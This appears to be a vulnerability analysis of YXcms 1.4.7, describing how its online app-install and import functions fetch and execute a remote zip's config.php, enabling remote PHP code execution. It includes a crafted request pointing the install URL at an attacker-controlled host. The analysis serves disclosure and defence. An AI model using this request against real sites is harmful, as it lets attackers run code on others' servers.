- **Root cause of vulnerability:** The vulnerability lies in the `onlineinstall` and `import` functions within the `indexController.php` file of YXcms 1.4.7. The `onlineinstall` function fetches a zip file from a provided URL without proper sanitization and saves it to a temporary location. The `import` function then extracts this zip file, locates the app name using `glob` which is vulnerable to path traversal and allows the execution of arbitrary PHP code from a `config.php` file within the extracted zip archive during the installation process without any sanitization or verification.
- **Weaknesses/vulnerabilities present:**
    - Unsanitized URL input in `onlineinstall` function.
    - Unvalidated file path in `import` function using glob pattern.
    - Arbitrary file upload and extraction via `Zip` class.
    - Lack of sanitization/verification of `config.php` content.
    - Execution of arbitrary PHP code from extracted `config.php` file.
- **Impact of exploitation:** Remote attackers can achieve arbitrary PHP code execution on the server.
- **Attack vectors:**
    - The attacker must have an accessible zip file containing malicious php code in a config.php file, hosted on a website.
    - The attacker can then craft a request to `index.php?r=appmanage/index/onlineinstall&url=http://<attacker controlled url>/aaa.zip`
- **Required attacker capabilities/position:**
    - The attacker needs to have an accessible zip file hosted on a website.
    - The attacker needs to be able to make web requests to the vulnerable YXcms installation.
    - The attacker needs to be aware of the vulnerable URL pattern and parameters for the `onlineinstall` function.
    - The attacker needs to have an administrator account, although it is noted this can be achieved through social engineering or weak credentials.
